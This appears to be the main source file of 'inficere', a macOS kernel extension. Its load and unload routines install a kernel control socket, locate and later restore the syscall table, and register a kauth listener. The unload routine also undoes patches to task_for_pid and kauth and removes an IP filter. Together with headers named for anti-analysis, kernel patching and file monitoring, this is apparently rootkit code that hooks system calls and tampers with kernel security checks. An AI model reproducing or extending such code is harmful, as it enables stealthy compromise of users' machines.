/*
 * Copyright (c) 2013, 2014 - Enzo Matsumiya (@enzolovesbacon)
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 1. Redistributions of source code must retain the above copyright
 *    notice, this list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright
 *    notice, this list of conditions and the following disclaimer in the
 *    documentation and/or other materials provided with the distribution.
 * 3. The name of the author may not be used to endorse or promote products
 *    derived from this software without specific prior written permission.
 *
 * THIS SOFTWARE IS PROVIDED BY THE AUTHOR ``AS IS'' AND ANY EXPRESS OR
 * IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES
 * OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED.
 * IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT, INDIRECT,
 * INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT
 * NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE,
 * DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY
 * THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
 * (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF
 * THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */

#include <libkern/libkern.h>
#include <mach/mach_types.h>
#include <mach/mach_vm.h>
#include <i386/proc_reg.h>
#include <mach/kmod.h>
#include <netinet/kpi_ipfilter.h>
#include "data_def.h"
#include "kctl.h"
#include "sysent.h"
#include "syscall.h"
#include "kinfo.h"
#include "cdisasm_utils.h"
#include "kpatch.h"
#include "anti.h"
#include "file_monitor.h"

struct kernel_info g_kernel_info;
extern ipfilter_t g_ip_filter_ipv4_ref;

kern_return_t inficere_start(kmod_info_t * ki, void *d);
kern_return_t inficere_stop(kmod_info_t *ki, void *d);

kern_return_t inficere_start(kmod_info_t * ki, void *d)
{
	install_kctl();
	
	if(find_sysent() != KERN_SUCCESS) {
		return KERN_FAILURE;
	}
	
	
	if(init_kinfo(&g_kernel_info) != KERN_SUCCESS) {
		return KERN_FAILURE;
	}
	
	if(init_kauth_listener() != KERN_SUCCESS) {
		return KERN_FAILURE;
	}
		
	return KERN_SUCCESS;
}

kern_return_t inficere_stop(kmod_info_t *ki, void *d)
{
	set_orig_sysent();
	
	patch_resume_flag(DISABLE);
	patch_task_for_pid(DISABLE);
	patch_kauth(DISABLE);
	
	if(g_ip_filter_ipv4_ref != NULL) {
		ipf_remove(g_ip_filter_ipv4_ref);
	}
	
	remove_kauth_listener();
	
	/* remove the kernel control socket (must be the last thing) */
	remove_kctl();
	
	return KERN_SUCCESS;
}
